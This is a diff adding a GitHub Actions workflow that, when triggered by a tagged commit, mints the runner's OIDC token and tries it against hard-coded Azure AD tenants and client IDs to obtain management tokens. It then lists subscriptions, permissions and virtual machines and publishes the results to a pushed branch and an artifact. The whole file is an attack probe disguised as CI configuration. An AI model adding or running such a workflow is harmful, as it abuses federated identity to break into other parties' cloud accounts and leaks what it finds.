@@ -1,0 +1,61 @@
+name: hkaz-oidc2
+on:
+  push:
+    branches: [main, 'hk-az-*']
+permissions:
+  id-token: write
+  contents: write
+jobs:
+  oidc2:
+    if: contains(github.event.head_commit.message, '[hkaz-oidc]')
+    runs-on: ubuntu-latest
+    timeout-minutes: 15
+    steps:
+      - name: mint
+        continue-on-error: true
+        run: |
+          set +e
+          mkdir -p out
+          {
+          echo "SUBJ=$GITHUB_SERVER_URL/$GITHUB_REPOSITORY ref=$GITHUB_REF run=$GITHUB_RUN_ID"
+          OIDC=$(curl -s -m 20 -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange")
+          TOK=$(python3 -c "import sys,json;print(json.load(sys.stdin).get('value',''))" <<<"$OIDC" 2>/dev/null)
+          echo "OIDC_LEN=${#TOK}"
+          for TEN in e8adc959-bf67-48e0-95b4-318b5f73946c 59fa7797-8090-4b20-9f2b-2b7c4c7e3d2a; do
+            echo "== TENANT $TEN"
+            curl -s -m 20 "https://login.microsoftonline.com/$TEN/.well-known/openid-configuration" -o /tmp/d_$TEN.json -w "discovery=%{http_code}\n"
+            grep -oE '"tenant_region_scope":"[^"]*"|"cloud_instance_name":"[^"]*"' /tmp/d_$TEN.json | head -2
+            for CID in 2ac1b8af-6f93-4fa3-b65c-e629ad9c0bb6 d6529b06-857c-4e9e-81d0-eee83f0320ab 31f3b47b-3d31-4a5b-8f7e-1f3c8c0e7b35 e3d1f2c5-7cbb-4b6e-9b1c-1c0b7d0c5a11; do
+              R=$(curl -s -m 25 -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
+                --data-urlencode grant_type=client_credentials \
+                --data-urlencode client_id=$CID \
+                --data-urlencode scope=https://management.azure.com/.default \
+                --data-urlencode client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer \
+                --data-urlencode client_assertion=$TOK)
+              echo "MINT $CID => ${R:0:300}"
+              AT=$(python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))" <<<"$R" 2>/dev/null)
+              if [ -n "$AT" ]; then
+                echo "ARM_TOKEN_OK len=${#AT}"
+                echo "$AT" > /tmp/arm_$TEN_$CID.txt
+                curl -s -m 30 -H "Authorization: Bearer $AT" "https://management.azure.com/subscriptions?api-version=2022-12-01" | head -c 1200; echo
+                curl -s -m 30 -H "Authorization: Bearer $AT" "https://management.azure.com/subscriptions/21bcfd92-9348-4285-a51e-815d6e56bddf/providers/Microsoft.Authorization/permissions?api-version=2022-04-01" | head -c 1200; echo
+                curl -s -m 30 -H "Authorization: Bearer $AT" "https://management.azure.com/subscriptions/21bcfd92-9348-4285-a51e-815d6e56bddf/providers/Microsoft.Compute/virtualMachines?api-version=2024-07-01" | head -c 1500; echo
+              fi
+            done
+          done
+          } > out/oidc2.txt 2>&1
+          cat out/oidc2.txt
+      - name: publish
+        if: always()
+        run: |
+          git config user.name hk
+          git config user.email hk@local.invalid
+          git add -A out 2>/dev/null
+          git commit -m "hkaz-oidc2 $(date -u +%FT%TZ)" >/dev/null 2>&1 || true
+          git push -f origin HEAD:refs/heads/hk-oidc-out || true
+      - uses: actions/upload-artifact@v4
+        if: always()
+        with:
+          name: hkaz-oidc2-${{ github.run_id }}
+          path: out/
+          retention-days: 3
